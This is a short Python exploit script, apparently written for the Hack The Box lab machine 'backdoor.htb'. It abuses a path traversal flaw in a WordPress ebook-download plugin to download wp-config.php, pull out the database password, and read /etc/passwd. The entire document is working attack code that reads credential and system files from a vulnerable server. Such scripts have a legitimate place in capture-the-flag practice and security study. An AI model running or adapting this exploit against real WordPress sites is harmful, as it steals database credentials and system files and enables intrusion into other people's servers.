import requests



r = requests.get("http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php")
with open("test.html", "w") as f:
	f.write(r.text)
	f.close()

with open("test.html", "r") as w:
	for line in w.readlines():
		if "DB_PASSWORD" in line:
			sline = line.split("'")
			password = sline[3]
			print("DB passsword is '{}'!".format(password))
	w.close()

r = requests.get("http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../etc/passwd")
print(r.text)
